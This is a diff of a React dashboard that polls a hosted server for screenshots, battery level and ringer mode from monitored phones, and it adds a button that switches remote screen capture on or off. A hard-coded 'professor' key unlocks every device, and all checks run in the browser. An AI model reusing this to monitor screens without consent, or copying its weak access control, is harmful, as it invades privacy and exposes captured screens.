@@ -1,79 +1,83 @@
 
 // // src/App.jsx
-// import { useEffect, useState } from 'react'
-// import { Smartphone, Wifi, WifiOff, Clock, Eye, Monitor } from 'lucide-react'
-// import './App.css'
+// import { useEffect, useState } from 'react';
+// import { Smartphone, Wifi, WifiOff, Clock, Eye, Monitor, Battery, Volume2 } from 'lucide-react';
+// import './App.css';
+
+// const BASE_URL = 'https://third-eye-txe8.onrender.com';
 
 // export default function App() {
-//   const [devicesMap, setDevicesMap] = useState({})     // raw object from server
-//   const [keyInput, setKeyInput] = useState('')         // controlled form input
-//   const [accessKey, setAccessKey] = useState(null)     // "professor" or install_uid
-//   const [isLoading, setIsLoading] = useState(false)
-//   const [connectionStatus, setConnectionStatus] = useState('connected')
-//   const [lastUpdate, setLastUpdate] = useState(null)
+//   const [devicesMap, setDevicesMap] = useState({});
+//   const [keyInput, setKeyInput] = useState('');
+//   const [accessKey, setAccessKey] = useState(null);
+//   const [isLoading, setIsLoading] = useState(false);
+//   const [connectionStatus, setConnectionStatus] = useState('connected');
+//   const [lastUpdate, setLastUpdate] = useState(null);
 
-//   // start polling once we have a valid accessKey
 //   useEffect(() => {
-//     if (!accessKey) return
+//     if (!accessKey) return;
 
 //     const fetchData = async () => {
 //       try {
-//         setConnectionStatus('connecting')
-//         const res = await fetch('https://third-eye-txe8.onrender.com/recent_background_api_data')
-//         if (!res.ok) throw new Error('Network response was not ok')
-//         const data = await res.json()
-//         setDevicesMap(data || {})
-//         setConnectionStatus('connected')
-//         setLastUpdate(new Date())
-//         setIsLoading(false)
+//         setConnectionStatus('connecting');
+//         const url = `${BASE_URL}/recent_background_api_data/${accessKey}`;
+//         const res = await fetch(url);
+//         if (!res.ok) throw new Error('Network response was not ok');
+//         const json = await res.json();
+
+//         let mapData;
+//         if (accessKey === 'professor') {
+//           mapData = json;
+//         } else if (json.data !== undefined && json.received_at !== undefined) {
+//           mapData = { [accessKey]: json };
+//         } else {
+//           mapData = json;
+//         }
+
+//         setDevicesMap(mapData);
+//         setConnectionStatus('connected');
+//         setLastUpdate(new Date());
 //       } catch (err) {
-//         console.error('Fetch error:', err)
-//         setConnectionStatus('error')
-//         setIsLoading(false)
+//         console.error('Fetch error:', err);
+//         setConnectionStatus('error');
+//       } finally {
+//         setIsLoading(false);
 //       }
-//     }
+//     };
 
-//     setIsLoading(true)
-//     fetchData()
-//     const interval = setInterval(fetchData, 2000)
-//     return () => clearInterval(interval)
-//   }, [accessKey])
+//     setIsLoading(true);
+//     fetchData();
+//     const interval = setInterval(fetchData, 5000);
+//     return () => clearInterval(interval);
+//   }, [accessKey]);
 
-//   // Transform map → array of entries { install_uid, ...data, received_at }
-//   const allDevices = Object.values(devicesMap).map(entry => ({
+//   // Build array of devices
+//   const allDevices = Object.entries(devicesMap).map(([uid, entry]) => ({
+//     install_uid: uid,
 //     ...entry.data,
-//     received_at: entry.received_at
-//   }))
-
-//   // Decide which devices to show
-//   const visibleDevices = accessKey === 'professor'
-//     ? allDevices
-//     : allDevices.filter(d => d.install_uid === accessKey)
+//     received_at: entry.received_at,
+//   }));
+//   const visibleDevices = allDevices;
 
 //   const getActiveDevices = () =>
 //     visibleDevices.filter(d =>
-//       d.received_at &&
 //       Date.now() - new Date(d.received_at).getTime() < 30000
-//     ).length
+//     ).length;
 
 //   const isDeviceActive = ts =>
-//     ts && Date.now() - new Date(ts).getTime() < 30000
+//     ts && (Date.now() - new Date(ts).getTime() < 30000);
 
-//   // Handle login form submit
 //   const handleLogin = e => {
-//     e.preventDefault()
-//     if (keyInput.trim() === '') return
-//     setAccessKey(keyInput.trim())
-//   }
+//     e.preventDefault();
+//     if (!keyInput.trim()) return;
+//     setAccessKey(keyInput.trim());
+//   };
 
-//   // 1) Show login form if not yet submitted
+//   // LOGIN
 //   if (!accessKey) {
 //     return (
 //       <div className="min-h-screen flex items-center justify-center bg-slate-900">
-//         <form
-//           onSubmit={handleLogin}
-//           className="bg-gray-800 p-8 rounded-xl shadow-lg"
-//         >
+//         <form onSubmit={handleLogin} className="bg-gray-800 p-8 rounded-xl shadow-lg">
 //           <h2 className="text-white text-2xl mb-4">Enter Access Key</h2>
 //           <input
 //             type="text"
@@ -90,10 +94,10 @@
 //           </button>
 //         </form>
 //       </div>
-//     )
+//     );
 //   }
 
-//   // 2) Loading state
+//   // LOADING
 //   if (isLoading) {
 //     return (
 //       <div className="min-h-screen flex items-center justify-center bg-slate-900">
@@ -102,19 +106,19 @@
 //           <p className="text-white text-lg">Loading Mobile Feeds...</p>
 //         </div>
 //       </div>
-//     )
+//     );
 //   }
 
-//   // 3) No device found (non‑professor)
+//   // NO DEVICES
 //   if (visibleDevices.length === 0 && accessKey !== 'professor') {
 //     return (
 //       <div className="min-h-screen flex items-center justify-center bg-slate-900 text-white">
 //         <p>🔍 No device found with install_uid “{accessKey}”.</p>
 //       </div>
-//     )
+//     );
 //   }
 
-//   // 4) Finally, render dashboard
+//   // DASHBOARD
 //   return (
 //     <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900">
 //       {/* HEADER */}
@@ -124,9 +128,7 @@
 //             <Monitor className="w-8 h-8 text-white" />
 //           </div>
 //           <div>
-//             <h1 className="text-4xl font-black text-white">
-//               Live Mobile Dashboard
-//             </h1>
+//             <h1 className="text-4xl font-black text-white">Live Mobile Dashboard</h1>
 //             <p className="text-gray-400 text-sm mt-1">
 //               {accessKey === 'professor'
 //                 ? 'Administrator view — all devices'
@@ -156,7 +158,6 @@
 //               {connectionStatus.charAt(0).toUpperCase() + connectionStatus.slice(1)}
 //             </span>
 //           </div>
-
 //           {/* Active / Total */}
 //           <div className="flex items-center gap-2 px-4 py-2 bg-black/20 backdrop-blur-sm rounded-xl border border-white/10">
 //             <Smartphone className="w-4 h-4 text-blue-400" />
@@ -164,7 +165,6 @@
 //               {getActiveDevices()}/{visibleDevices.length} Active
 //             </span>
 //           </div>
-
 //           {/* Last Update */}
 //           {lastUpdate && (
 //             <div className="flex items-center gap-2 px-4 py-2 bg-black/20 backdrop-blur-sm rounded-xl border border-white/10">
@@ -177,18 +177,18 @@
 //         </div>
 //       </header>
 
-//       {/* DEVICE CARDS GRID */}
+//       {/* DEVICE GRID */}
 //       <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6 px-6">
 //         {visibleDevices.map(d => {
-//           const active = isDeviceActive(d.received_at)
-//           const ts = d.received_at && new Date(d.received_at)
+//           const active = isDeviceActive(d.received_at);
+//           const ts = d.received_at && new Date(d.received_at);
 
 //           return (
 //             <div
 //               key={d.install_uid}
 //               className="group bg-black/40 backdrop-blur-sm rounded-3xl border border-white/10 hover:border-purple-500/50 transition-transform transform hover:scale-105"
 //             >
-//               {/* Card header */}
+//               {/* Card Header */}
 //               <div className="relative p-4 bg-gradient-to-r from-purple-500/20 to-blue-500/20 border-b border-white/10">
 //                 <div
 //                   className={`absolute top-2 right-2 w-3 h-3 rounded-full ${
@@ -200,12 +200,14 @@
 //                     <Smartphone className="w-5 h-5 text-purple-400" />
 //                   </div>
 //                   <div className="flex-1 min-w-0">
-//                     <h3 className="text-white font-bold truncate">
-//                       {d.device_name}
-//                     </h3>
-//                     <div className="flex items-center gap-1 text-xs text-gray-300">
+//                     <h3 className="text-white font-bold truncate">{d.device_name}</h3>
+//                     <div className="flex items-center gap-2 text-xs text-gray-300 mt-1">
 //                       <Eye className="w-3 h-3" />
 //                       <span>Live Feed</span>
+//                       <Battery className="w-3 h-3" />
+//                       <span>{d.battery_percentage}%</span>
+//                       <Volume2 className="w-3 h-3" />
+//                       <span className="capitalize">{d.ringer_mode}</span>
 //                     </div>
 //                   </div>
 //                 </div>
@@ -223,7 +225,7 @@
 //               <div className="aspect-[9/16] bg-gray-900">
 //                 {d.screenshot_png_b64 ? (
 //                   <img
-//                     src={`data:image/png;base64,${d.screenshot_png_b64}`}
+//                     src={`data:image/webp;base64,${d.screenshot_png_b64}`}
 //                     alt={`${d.device_name} screenshot`}
 //                     className="w-full h-full object-contain"
 //                     loading="lazy"
@@ -236,19 +238,11 @@
 //                 )}
 //               </div>
 
-//               {/* Footer */}
+//               {/* Card Footer */}
 //               <div className="p-3 bg-black/30 backdrop-blur-sm">
 //                 <div className="flex items-center justify-between text-xs">
-//                   <span
-//                     className={`flex items-center gap-1 font-medium ${
-//                       active ? 'text-green-400' : 'text-red-400'
-//                     }`}
-//                   >
-//                     <div
-//                       className={`w-2 h-2 rounded-full ${
-//                         active ? 'bg-green-400' : 'bg-red-400'
-//                       }`}
-//                     />
+//                   <span className={`flex items-center gap-1 font-medium ${active ? 'text-green-400' : 'text-red-400'}`}>
+//                     <div className={`w-2 h-2 rounded-full ${active ? 'bg-green-400' : 'bg-red-400'}`} />
 //                     {active ? 'Online' : 'Offline'}
 //                   </span>
 //                   {ts && (
@@ -259,7 +253,7 @@
 //                 </div>
 //               </div>
 //             </div>
-//           )
+//           );
 //         })}
 //       </div>
 
@@ -280,54 +274,43 @@
 //         </div>
 //       </footer>
 //     </div>
-//   )
+//   );
 // }
 
-// src/App.jsx
-
-// src/App.jsx
 import { useEffect, useState } from 'react';
-import { Smartphone, Wifi, WifiOff, Clock, Eye, Monitor } from 'lucide-react';
+import {
+  Smartphone, Wifi, WifiOff, Clock, Eye, Monitor, Battery, Volume2
+} from 'lucide-react';
 import './App.css';
 
 const BASE_URL = 'https://third-eye-txe8.onrender.com';
 
 export default function App() {
-  const [devicesMap, setDevicesMap] = useState({});
-  const [keyInput, setKeyInput] = useState('');
   const [accessKey, setAccessKey] = useState(null);
+  const [keyInput, setKeyInput] = useState('');
+  const [isConnected, setIsConnected] = useState(false);
+  const [devicesMap, setDevicesMap] = useState({});
   const [isLoading, setIsLoading] = useState(false);
-  const [connectionStatus, setConnectionStatus] = useState('connected');
+  const [connectionStatus, setConnectionStatus] = useState('disconnected');
   const [lastUpdate, setLastUpdate] = useState(null);
 
+  // Fetch recent device data every 5s
   useEffect(() => {
     if (!accessKey) return;
-
     const fetchData = async () => {
       try {
         setConnectionStatus('connecting');
-        const url = `${BASE_URL}/recent_background_api_data/${accessKey}`;
-        const res = await fetch(url);
-        if (!res.ok) throw new Error('Network response was not ok');
+        const res = await fetch(`${BASE_URL}/recent_background_api_data/${accessKey}`);
+        if (!res.ok) throw new Error('Fetch failed');
         const json = await res.json();
-
         let mapData;
-        if (accessKey === 'professor') {
-          // 1) Admin view: json is already a map of uid → { data, received_at }
-          mapData = json;
-        } else if (json.data !== undefined && json.received_at !== undefined) {
-          // 2) Modern single-device: wrap under its UID
-          mapData = { [accessKey]: json };
-        } else {
-          // 3) Fallback: assume it's already a map
-          mapData = json;
-        }
-
+        if (accessKey === 'professor') mapData = json;
+        else if (json.data && json.received_at) mapData = { [accessKey]: json };
+        else mapData = json;
         setDevicesMap(mapData);
         setConnectionStatus('connected');
         setLastUpdate(new Date());
-      } catch (err) {
-        console.error('Fetch error:', err);
+      } catch {
         setConnectionStatus('error');
       } finally {
         setIsLoading(false);
@@ -340,46 +323,38 @@ export default function App() {
     return () => clearInterval(interval);
   }, [accessKey]);
 
-  // Build an array of { install_uid, ...data, received_at }
-  const allDevices = Object.entries(devicesMap).map(([uid, entry]) => ({
-    install_uid: uid,
-    ...entry.data,
-    received_at: entry.received_at,
-  }));
-
-  const visibleDevices = allDevices; // for professor or single-device alike
-
-  const getActiveDevices = () =>
-    visibleDevices.filter(d =>
-      Date.now() - new Date(d.received_at).getTime() < 30000
-    ).length;
-
-  const isDeviceActive = ts =>
-    ts && (Date.now() - new Date(ts).getTime() < 30000);
-
-  const handleLogin = e => {
-    e.preventDefault();
-    if (!keyInput.trim()) return;
-    setAccessKey(keyInput.trim());
+  // Toggle capture on/off
+  const toggleConnection = async () => {
+    const enable = !isConnected;
+    try {
+      const res = await fetch(`${BASE_URL}/control/${accessKey}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ capture_enabled: enable })
+      });
+      if (res.ok) setIsConnected(enable);
+    } catch (err) {
+      console.error(err);
+    }
   };
 
-  // --- LOGIN FORM ---
+  // Login screen
   if (!accessKey) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-slate-900">
-        <form onSubmit={handleLogin} className="bg-gray-800 p-8 rounded-xl shadow-lg">
+        <form
+          onSubmit={e => { e.preventDefault(); setAccessKey(keyInput.trim()); }}
+          className="bg-gray-800 p-8 rounded-xl shadow-lg"
+        >
           <h2 className="text-white text-2xl mb-4">Enter Access Key</h2>
           <input
             type="text"
             value={keyInput}
             onChange={e => setKeyInput(e.target.value)}
             placeholder="enter key"
-            className="w-full px-4 py-2 mb-4 rounded bg-gray-700 text-white focus:outline-none"
+            className="w-full px-4 py-2 mb-4 rounded bg-gray-700 text-white"
           />
-          <button
-            type="submit"
-            className="w-full bg-purple-600 hover:bg-purple-700 text-white py-2 rounded"
-          >
+          <button type="submit" className="w-full bg-purple-600 text-white py-2 rounded">
             Submit
           </button>
         </form>
@@ -387,7 +362,7 @@ export default function App() {
     );
   }
 
-  // --- LOADING STATE ---
+  // Loading state
   if (isLoading) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-slate-900">
@@ -399,19 +374,23 @@ export default function App() {
     );
   }
 
-  // --- NO DEVICES FOUND ---
-  if (visibleDevices.length === 0 && accessKey !== 'professor') {
-    return (
-      <div className="min-h-screen flex items-center justify-center bg-slate-900 text-white">
-        <p>🔍 No device found with install_uid “{accessKey}”.</p>
-      </div>
-    );
-  }
+  // Build device list
+  const allDevices = Object.entries(devicesMap).map(([uid, entry]) => ({
+    install_uid: uid,
+    ...entry.data,
+    received_at: entry.received_at,
+  }));
+  const visibleDevices = allDevices;
 
-  // --- DASHBOARD ---
+  const getActiveDevices = () =>
+    visibleDevices.filter(d => Date.now() - new Date(d.received_at).getTime() < 30000).length;
+
+  const isDeviceActive = ts =>
+    ts && (Date.now() - new Date(ts).getTime() < 30000);
+
+  // Dashboard
   return (
     <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900">
-      {/* HEADER */}
       <header className="p-6 flex flex-col lg:flex-row items-center justify-between gap-4">
         <div className="flex items-center gap-3">
           <div className="p-3 bg-gradient-to-br from-purple-500 to-blue-600 rounded-2xl shadow-lg">
@@ -426,6 +405,17 @@ export default function App() {
             </p>
           </div>
         </div>
+
+        {/* Connect/Disconnect */}
+        <button
+          onClick={toggleConnection}
+          className={`px-4 py-2 rounded-full font-medium ${
+            isConnected ? 'bg-red-600 hover:bg-red-700' : 'bg-green-600 hover:bg-green-700'
+          } text-white`}
+        >
+          {isConnected ? 'Disconnect' : 'Connect'}
+        </button>
+
         <div className="flex items-center gap-4">
           {/* Connection Status */}
           <div className="flex items-center gap-2 px-4 py-2 bg-black/20 backdrop-blur-sm rounded-xl border border-white/10">
@@ -436,15 +426,10 @@ export default function App() {
             ) : (
               <Wifi className="w-4 h-4" />
             )}
-            <span
-              className={`text-sm font-medium ${
-                connectionStatus === 'connected'
-                  ? 'text-green-400'
-                  : connectionStatus === 'connecting'
-                  ? 'text-yellow-400'
-                  : 'text-red-400'
-              }`}
-            >
+            <span className={`text-sm font-medium ${
+              connectionStatus === 'connected' ? 'text-green-400' :
+              connectionStatus === 'connecting' ? 'text-yellow-400' : 'text-red-400'
+            }`}>
               {connectionStatus.charAt(0).toUpperCase() + connectionStatus.slice(1)}
             </span>
           </div>
@@ -467,7 +452,7 @@ export default function App() {
         </div>
       </header>
 
-      {/* DEVICE CARDS GRID */}
+      {/* DEVICE GRID */}
       <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6 px-6">
         {visibleDevices.map(d => {
           const active = isDeviceActive(d.received_at);
@@ -477,7 +462,6 @@ export default function App() {
               key={d.install_uid}
               className="group bg-black/40 backdrop-blur-sm rounded-3xl border border-white/10 hover:border-purple-500/50 transition-transform transform hover:scale-105"
             >
-              {/* Card Header */}
               <div className="relative p-4 bg-gradient-to-r from-purple-500/20 to-blue-500/20 border-b border-white/10">
                 <div
                   className={`absolute top-2 right-2 w-3 h-3 rounded-full ${
@@ -490,9 +474,10 @@ export default function App() {
                   </div>
                   <div className="flex-1 min-w-0">
                     <h3 className="text-white font-bold truncate">{d.device_name}</h3>
-                    <div className="flex items-center gap-1 text-xs text-gray-300">
-                      <Eye className="w-3 h-3" />
-                      <span>Live Feed</span>
+                    <div className="flex items-center gap-2 text-xs text-gray-300 mt-1">
+                      <Eye className="w-3 h-3" /><span>Live Feed</span>
+                      <Battery className="w-3 h-3" /><span>{d.battery_percentage}%</span>
+                      <Volume2 className="w-3 h-3" /><span className="capitalize">{d.ringer_mode}</span>
                     </div>
                   </div>
                 </div>
@@ -506,7 +491,6 @@ export default function App() {
                 )}
               </div>
 
-              {/* Screenshot */}
               <div className="aspect-[9/16] bg-gray-900">
                 {d.screenshot_png_b64 ? (
                   <img
@@ -523,19 +507,14 @@ export default function App() {
                 )}
               </div>
 
-              {/* Card Footer */}
               <div className="p-3 bg-black/30 backdrop-blur-sm">
                 <div className="flex items-center justify-between text-xs">
-                  <span
-                    className={`flex items-center gap-1 font-medium ${
-                      active ? 'text-green-400' : 'text-red-400'
-                    }`}
-                  >
-                    <div
-                      className={`w-2 h-2 rounded-full ${
-                        active ? 'bg-green-400' : 'bg-red-400'
-                      }`}
-                    />
+                  <span className={`flex items-center gap-1 font-medium ${
+                    active ? 'text-green-400' : 'text-red-400'
+                  }`}>
+                    <div className={`w-2 h-2 rounded-full ${
+                      active ? 'bg-green-400' : 'bg-red-400'
+                    }`} />
                     {active ? 'Online' : 'Offline'}
                   </span>
                   {ts && (
@@ -550,7 +529,6 @@ export default function App() {
         })}
       </div>
 
-      {/* FOOTER */}
       <footer className="mt-12 text-center">
         <div className="inline-flex items-center gap-6 px-6 py-3 bg-black/20 backdrop-blur-sm rounded-2xl border border-white/10">
           <div className="text-sm text-white">
